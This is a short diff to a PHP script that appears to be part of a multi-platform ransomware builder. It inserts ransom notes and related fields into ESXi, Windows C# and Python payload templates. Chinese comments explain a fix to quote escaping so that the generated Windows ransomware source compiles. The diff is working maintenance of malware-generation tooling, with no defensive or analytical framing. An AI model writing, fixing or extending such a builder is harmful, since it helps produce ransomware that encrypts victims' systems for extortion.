@@ -58,7 +58,19 @@ if ($platform === 'esxi') {
     foreach ($ransom as $k=>$v) {
         $tpl = str_replace('{{RANSOM_'.strtoupper($k).'}}', str_replace("'","'\\''", $v), $tpl);
     }
+} elseif ($platform === 'win') {
+    // C# 的 NOTE 是 verbatim string (@"...")：里面唯一需要转义的是双引号，
+    // 且写法是 "" 而不是 \" ，反斜杠完全不转义。
+    // 旧实现与其他平台共用 addcslashes(..., "'\"\\")，把 " 变成 \" ——
+    // 在 verbatim string 里这压根不是转义，引号照样提前结束字符串，
+    // 生成的 .cs 编译不过（勒索信里带 " 是常态，例如 -K "<passphrase>"）。
+    $note_esc = str_replace('"', '""', $note);
+    $tpl = str_replace('{{RANSOM_NOTE}}', $note_esc, $tpl);
+    foreach ($ransom as $k=>$v) {
+        $tpl = str_replace('{{RANSOM_'.strtoupper($k).'}}', str_replace('"','""',$v), $tpl);
+    }
 } else {
+    // Python 三引号字符串: \" 与 \' 都是合法转义
     $tpl = str_replace('{{RANSOM_NOTE}}', addcslashes($note, "'\"\\"), $tpl);
     foreach ($ransom as $k=>$v) {
         $tpl = str_replace('{{RANSOM_'.strtoupper($k).'}}', addcslashes($v, "'\"\\"), $tpl);
